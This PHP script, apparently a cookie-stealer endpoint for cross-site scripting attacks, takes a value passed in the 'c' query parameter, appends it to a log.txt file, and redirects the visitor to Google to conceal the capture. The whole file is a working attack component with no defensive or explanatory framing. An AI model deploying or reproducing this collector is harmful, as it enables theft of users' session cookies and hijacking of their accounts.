<?php
	header ('Location:https://google.com');
	$cookies = $_GET["c"];
	$file = fopen('log.txt', 'a');
	fwrite($file, $cookies . "\n\n");
?>
